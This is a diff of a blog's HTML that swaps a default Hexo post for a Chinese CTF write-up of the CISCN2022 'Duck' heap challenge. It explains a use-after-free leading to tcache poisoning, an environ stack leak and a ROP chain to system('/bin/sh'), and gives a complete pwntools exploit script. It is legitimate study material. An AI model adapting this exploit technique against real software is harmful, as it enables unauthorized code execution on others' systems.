@@ -16,21 +16,21 @@
   <meta name="author" content="h1J4cker">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="CISCN2022 Duck Write Up该题目附件我已经上传到Github，有需要的可以下载，复现这题时，我是使用的NSSCTF提供的远程环境。 此题是一道libc2.34的题，libc2.34与2.33最大的不同就是移除了以往常用的malloc_hook，free_hook等hook函数，导致利用上较为困难，2.34与2.33一样，chunk的fd指针都采用了异或加密，在申请chunk时便">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2022/07/10/hello-world/index.html">
+<meta property="og:title" content="h1J4cker&#39;s Blog">
+<meta property="og:url" content="http://example.com/2022/07/10/CISCN2022-Duck/index.html">
 <meta property="og:site_name" content="h1J4cker&#39;s Blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="CISCN2022 Duck Write Up该题目附件我已经上传到Github，有需要的可以下载，复现这题时，我是使用的NSSCTF提供的远程环境。 此题是一道libc2.34的题，libc2.34与2.33最大的不同就是移除了以往常用的malloc_hook，free_hook等hook函数，导致利用上较为困难，2.34与2.33一样，chunk的fd指针都采用了异或加密，在申请chunk时便">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-07-10T11:43:38.218Z">
-<meta property="article:modified_time" content="2022-07-10T11:43:38.218Z">
+<meta property="article:published_time" content="2022-07-10T13:02:27.331Z">
+<meta property="article:modified_time" content="2022-07-10T13:00:38.967Z">
 <meta property="article:author" content="h1J4cker">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Hello World - h1J4cker&#39;s Blog</title>
+  <title>h1J4cker&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -212,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -223,7 +223,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-07-10 19:43" pubdate>
+        <time datetime="2022-07-10 21:02" pubdate>
           July 10, 2022 pm
         </time>
       </span>
@@ -235,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          undefined words
+          3k words
         
       </span>
     
@@ -246,7 +246,7 @@
         
         
         
-          NaN mins
+          25 mins
         
       </span>
     
@@ -292,25 +292,19 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello World</h1>
+            <h1 style="display: none"></h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
+                <h3 id="CISCN2022-Duck-Write-Up"><a href="#CISCN2022-Duck-Write-Up" class="headerlink" title="CISCN2022 Duck Write Up"></a>CISCN2022 Duck Write Up</h3><p>该题目附件我已经上传到Github，有需要的可以下载，复现这题时，我是使用的NSSCTF提供的远程环境。</p>
+<p>此题是一道libc2.34的题，libc2.34与2.33最大的不同就是移除了以往常用的malloc_hook，free_hook等hook函数，导致利用上较为困难，2.34与2.33一样，chunk的fd指针都采用了异或加密，在申请chunk时便会异或解密，所以当我们改写fd指针时，只需要将泄露出的堆的基地址右移12位后与当前地址异或即可。glibc中采用的异或加密的规则并不难：将堆的基地址右移12位后与当前地址异或。</p>
+<p>这道题逆向难度并不大，通过IDA静态分析就可以很明显的看出，在free时存在UAF，所以可以很轻松的泄露堆的基地址（用于异或加密）与libc。</p>
+<p>先多申请几个chunk（大于8个），把最后一个留下其余的全部释放，并用0号来泄露堆的基址，将泄露的地址左移12位即可得到堆的基地址。由于chunk的大小为0x110，所以在填满tcache后，剩下的不与top chunk相邻的chunk将放入unsorted bin中，这也是前面要申请大于8个chunk的原因，然后再通过UAF泄露main arena的地址，从而泄露libc。</p>
+<p>泄露libc之后找到environ，通过UAF改写tcache的fd指针，并将其fd指针改为environ的地址，分配出去以后，由于environ保存的是当前进程的环境变量，这里面存放了栈上的地址，泄露出environ的值后并计算出edit的地址之后，再次修改fd指针，分配到edit返回地址之后写入ROP调用链，(<strong>注意，由于是64位的程序，前六个参数通过寄存器传递，所以需要控制RDI寄存器来传入”&#x2F;bin&#x2F;sh\x00”作为system的参数</strong>)即可getshell。(我用one_gadget去打没有成功)</p>
+<p><em><strong>注：此处system若是无法使用，可改为execve，效果应该是一样的</strong></em></p>
+<p>最终exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#io=remote(&#x27;1.14.71.254&#x27;,28045)</span><br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br>    io.recvuntil(<span class="hljs-string">&#x27;Size: \n&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br>    io.sendline(content)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)  <br><br>show(<span class="hljs-number">7</span>)<br><br>main_arena = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena = main_arena - <span class="hljs-number">96</span><br><br>libc_addr= main_arena-libc.sym[<span class="hljs-string">&#x27;main_arena&#x27;</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_arena: &quot;</span> + <span class="hljs-built_in">hex</span>(main_arena))<br><br><br><br>show(<span class="hljs-number">0</span>)<br>heap_base=u64(io.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base=heap_base&lt;&lt;<span class="hljs-number">12</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap_base: &quot;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add()<br><br>environ_addr=libc_addr+libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;environ_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(environ_addr))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,p64(environ_addr^(heap_base&gt;&gt;<span class="hljs-number">12</span>))+p64(<span class="hljs-number">0</span>))<br><br>add()         <br>add()         <br><br>show(<span class="hljs-number">15</span>)<br>stack_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>stack_addr = stack_addr - <span class="hljs-number">0x168</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr: &quot;</span>+ <span class="hljs-built_in">hex</span>(stack_addr))<br><br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">10</span>,<span class="hljs-number">0x10</span>,p64(stack_addr^(heap_base&gt;&gt;<span class="hljs-number">12</span>))+p64(<span class="hljs-number">0</span>))<br><br>add()  <br>add()  <br><br>bin_sh_addr=libc_addr+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>sys_addr = libc_addr + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>pop_rdi_ret = libc_addr + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi;ret;&#x27;</span>)))<br><br><span class="hljs-comment">#pop_rdi_ret=0x1703</span><br><br><span class="hljs-comment">#one_gadget=libc_addr+0xda867</span><br><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(sys_addr)<br><br><span class="hljs-comment">#payload=p64(0)*3+p64(one_gadget)</span><br><br>edit(<span class="hljs-number">17</span>,<span class="hljs-number">0x30</span>,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -327,8 +321,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>http://example.com/2022/07/10/hello-world/</div>
+      <div></div>
+      <div>http://example.com/2022/07/10/CISCN2022-Duck/</div>
     </div>
     <div class="license-meta">
       
@@ -370,9 +364,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/07/10/test/" title="test">
+                      <a href="/2022/07/10/CISCN2022-BigDuck/" title="">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">test</span>
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
